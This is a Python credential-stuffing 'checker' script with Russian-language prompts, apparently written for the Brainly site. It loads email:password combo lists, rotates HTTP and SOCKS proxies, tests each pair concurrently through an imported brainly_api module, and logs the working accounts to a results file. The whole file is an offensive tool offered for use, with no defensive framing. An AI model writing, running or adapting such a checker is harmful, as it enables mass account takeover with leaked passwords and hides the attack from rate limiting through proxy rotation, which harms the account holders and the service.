import logging, brainly_api, itertools

info = 'Checker by _Skill_'
logging.basicConfig(level=logging.INFO)



class Checker(object):
    def __init__(self):
        import datetime
        self.io = 0
        self.proxies = []
        self.acc_array = []
        self.date = datetime.datetime.now().strftime("%d%m%Y-%H%M%S")
        try:
            self.filename = open('./results/BRAINLY-{}.txt'.format(self.date), 'a')
        except FileNotFoundError:
            os.mkdir('results')
            self.filename = open('./results/BRAINLY-{}.txt'.format(self.date), 'a')

    def load_proxies(self, proxies_path, p_type):
        if p_type == 'http/s' or p_type == '1':
            file = open(proxies_path, 'r').readlines()
            file = [pr.rstrip() for pr in file]
            for lines in file:
                data = lines.replace('\n', '')
                self.proxies.append({'proxy':{'http': 'http://'+data,
                                              'https': 'http://'+data}})
                
        elif p_type == 'socks4' or p_type == '2':
            file = open(proxies_path, 'r').readlines()
            file = [pr.rstrip() for pr in file]
            for lines in file:
                data = lines.replace('\n', '')
                self.proxies.append({'proxy':{'http': 'socks4://'+data,
                                              'https':'socks4://'+data}})
                
        elif p_type == 'socks5' or p_type == '3':
            file = open(proxies_path, 'r').readlines()
            file = [pr.rstrip() for pr in file]
            for lines in file:
                data = lines.replace('\n', '')
                self.proxies.append({'proxy':{'http': 'socks5://'+data,
                                              'https': 'socks5://'+data}})
                
        else: self.proxies.append({'proxy':None})

    def load(self, base_path):
        file = open(base_path, 'r', encoding='latin-1').readlines()
        file = [combos.rstrip() for combos in file]
        for lines in file:
            data = lines.replace('\n', '').split(':')
            try:
                data[1] += ''
            except IndexError:
                data.append('1')
            self.acc_array.append({'em': data[0],
                                   'pw': data[1]})

    def write_info(self, info):
        logging.info('Новый аккаунт')
        self.filename.write(info)
        self.filename.flush()


    def login(self, acc, pr):
        email = acc['em']
        password = acc['pw']
        proxy = pr['proxy']
        result = brainly_api.check(email, password, proxy)
        if result != None:
            self.write_info(result)


    def main(self, threads):
        from multiprocessing.dummy import Pool
        self.load(base_path)
        self.load_proxies(proxies_path, p_type)
        self.threads = threads
        pool = Pool(self.threads)
        pool.starmap(self.login, zip(self.acc_array, itertools.cycle(self.proxies)))
        #for _ in pool.imap_unordered(self.login, self.acc_array):
         #   pass



if __name__ == '__main__':
    import time, os
    logging.info(info)
    while True:
        try:
            path = input('Выберите базу --> ')
            proxies_path = input('Выберите прокси --> ')
            p_type = input('Тип прокси(http/s, socks4, socks5) --> ')
            threads = int(input('Количество потоков --> '))
            base_path = os.path.abspath(r''.join(path.replace('"', '').strip())).replace('\\', '/')
            proxies_path = os.path.abspath(r''.join(proxies_path.replace('"', '').strip())).replace('\\', '/')
            start = time.time()
            Checker().main(threads)
            logging.info('Закончено за {} сек.\n--------------------'.format(str(round(time.time() - start, 2))))
        except KeyboardInterrupt:
            logging.info('Остановлено')
            os._exit(1)
        #except:
         #   logging.error('Что-то пошло не так')
